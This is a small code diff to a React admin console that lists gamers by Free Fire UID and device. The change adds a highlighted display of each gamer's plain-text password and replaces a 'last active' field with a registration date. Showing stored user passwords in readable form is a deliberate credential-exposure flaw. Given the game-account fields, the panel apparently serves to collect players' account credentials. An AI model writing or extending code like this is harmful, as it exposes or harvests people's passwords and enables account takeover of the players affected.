@@ -182,8 +182,11 @@ export const AdminConsoleModal: React.FC<AdminConsoleModalProps> = ({
                   </div>
                   <div className="text-[11px] text-[#9A9AA6] flex flex-wrap items-center gap-3">
                     <span>UID: <strong className="text-white font-mono">{gamer.freeFireUid}</strong></span>
+                    {gamer.password && (
+                      <span>Pass: <strong className="text-[#FDE047] font-mono bg-yellow-950/40 px-1.5 py-0.5 rounded border border-yellow-700/30">{gamer.password}</strong></span>
+                    )}
                     <span>Device: {gamer.deviceModel}</span>
-                    <span>Active: {gamer.lastActive}</span>
+                    <span>Date: {gamer.registeredAt}</span>
                   </div>
                 </div>
 
